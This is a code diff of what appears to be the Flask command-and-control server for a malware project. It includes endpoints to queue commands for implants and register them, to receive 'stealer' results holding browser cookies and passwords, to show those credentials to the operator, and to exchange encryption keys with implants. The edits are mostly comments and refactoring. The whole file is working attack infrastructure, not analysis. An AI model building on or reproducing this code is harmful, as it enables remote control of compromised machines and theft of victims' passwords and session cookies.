@@ -65,7 +65,7 @@ def create_token():
         print(f"error logging in: {error}")
         return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}
 
-# api endpoint to queue a command
+# api endpoint to queue a command, from client side
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
 def handle_execute():
@@ -87,7 +87,8 @@ def handle_execute():
         print(f"Failure sending commands: {error}")
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# List all commands for a particular implant, with steg
+# UNUSED
+# List all commands for a particular implant, with steg 
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -148,7 +149,6 @@ def get_commands():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-
 # Client endpoint for listing commands
 @app.route("/client_get_commands", methods=["POST"])
 def client_get_commands():
@@ -164,7 +164,7 @@ def client_get_commands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-# Register an implant, on the implant side TODO
+# Register an implant, on the implant side 
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -188,9 +188,7 @@ def register_implant():
         print(f"ERROR: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
-# Display implants
-
-
+# Display implants, for client
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -210,10 +208,10 @@ def handle_response_stealer():
         data = request.data
         data = json.loads(data)
         print("Before calling wyatts wonderland")
+
         cookie_values, password_values = WyattWonderland.newParseJSON(data)
         print("After calling wyatts wonderland")
         task_id = data['task_id']
-        target_implant_id = data['target_implant_id'] 
         # tools.updateLastSeen(target_implant_id) 
         success = data['success']
         if success in ['Success', 'success']:
@@ -238,6 +236,8 @@ def handle_response_stealer():
         print(error)
         return error, 402, {'Access-Control-Allow-Origin': config.clientURL}
 
+
+# For client, to display passwords and cookies on client side
 @app.route("/display_passwords", methods=["POST"])
 def handle_passwords():
     try: 
@@ -265,67 +265,37 @@ def handle_passwords():
         return e, 400, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-    
+
 ## Route for implant to post new symkey
 @app.route("/new_symkey", methods=["POST"])
 @cross_origin()
 def new_symkey():
     print("Received response")
     try:
-        if (request.content_length < 512):
-            data = request.get_data()
-            data = RsaDecryption.rsadecrypt(data)
-            for x in range(len(data)):
-                print(data[x])
-            # print(len(data))
-            datastr = data.decode("utf-8")
-            for x in (range(len(datastr))):
-                print(datastr[x])
-            print(datastr)
-            databytes = bytes.fromhex(datastr)
-            print(databytes)
-            data = RsaDecryption.rsadecrypt(databytes)
-            xor.symkey=data
-            print("response:")
-            print(data)
-            print(str(data))
-            print(jsonify(data))
-            return "success", 200, {'Access-Control-Allow-Origin': config.clientURL} 
+        if (request.content_length >= 512):
+            return "too big", 304, {'Access-Control-Allow-Origin': config.clientURL} 
+        data = request.get_data()
+        data = RsaDecryption.rsadecrypt(data)
+        for x in range(len(data)):
+            print(data[x])
+        # print(len(data))
+        datastr = data.decode("utf-8")
+        for x in (range(len(datastr))):
+            print(datastr[x])
+        print(datastr)
+        databytes = bytes.fromhex(datastr)
+        print(databytes)
+        data = RsaDecryption.rsadecrypt(databytes)
+        xor.symkey=data
+        print("response:")
+        print(data)
+        print(str(data))
+        print(jsonify(data))
+        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL} 
     except Exception as error:
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL} 
 
-        """
-        target_implant_id = data['target_implant_id']
-        task_id = data['task_id']
-        response_data = data['response_data']
-        success = data['success']
-        command = data['command']
-        print("checking command: " + command)
-        print("Querying now")
-        # DUMP BACK INTO TASK_QUEUE
-
-        if success in ["success", "Success"]:
-            success = True
-        else:
-            success = False
-
-        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-        if query == []:
-            print("\n\nupdate task queue worked\n\n")
-        time = datetime.now()
-        print(response_data, success, time, task_id)
-        response = tools.executeGenericVar(
-            query, [response_data, success, time, task_id])
-        print(response)
-        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
-
-    except Exception as error:
-        print(error)
-        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
-else:
-    return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
-    """
 
 # Implant response endpoint, in json
 @app.route("/response_json", methods=["POST"])
@@ -333,28 +303,31 @@ else:
 def handle_response_json():
     print("Recieved response")
     try:
+        # Check content length
         if (request.content_length >= 4000):
             return "nuar", 405, {'Access-Control-Allow-Origin': '*'}
             
         data = request.json
-        
-
         print("response:")
         target_implant_id = data['target_implant_id']
+
+        # Update last seen
         tools.updateLastSeen(target_implant_id)
+
+        # Get data from request 
         task_id = data['task_id']
         response_data = data['response_data']
         success = data['success']
         command = data['command']
         print("checking command: " + command)
         print("Querying now")
-        # DUMP BACK INTO TASK_QUEUE
 
         if success in ["success", "Success"]:
             success = True
         else:
             success = False
 
+        # Update the task queue 
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
         time = datetime.now()
         print(response_data, success, time, task_id)
@@ -372,7 +345,8 @@ def handle_response_json():
         print()
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
-# Gets log history of a particular implant, for console
+# Gets log history of a particular implant, for client
+# Makes a sorted list of log objects
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
@@ -405,20 +379,20 @@ def get_history():
         return e, {'Access-Control-Allow-Origin': '*'}
 
 
-#Displays files to client
-@app.route("/get_files", methods=["POST"])
-def get_files():
-    try: 
-        data = request.json
-        id = data['id']
-        query = (f"SELECT path from files where target_implant_id = {id}")
+# #Displays files to client
+# @app.route("/get_files", methods=["POST"])
+# def get_files():
+#     try: 
+#         data = request.json
+#         id = data['id']
+#         query = (f"SELECT path from files where target_implant_id = {id}")
 
-        dbresp = tools.executeSelectQuery(query)
+#         dbresp = tools.executeSelectQuery(query)
 
-        return dbresp, 200, {'Access-Control-Allow-Origin': '*'}
-    except Exception as e:
-        print(e)
-        return e, 405, {'Access-Control-Allow-Origin': '*'}
+#         return dbresp, 200, {'Access-Control-Allow-Origin': '*'}
+#     except Exception as e:
+#         print(e)
+#         return e, 405, {'Access-Control-Allow-Origin': '*'}
 
     
 
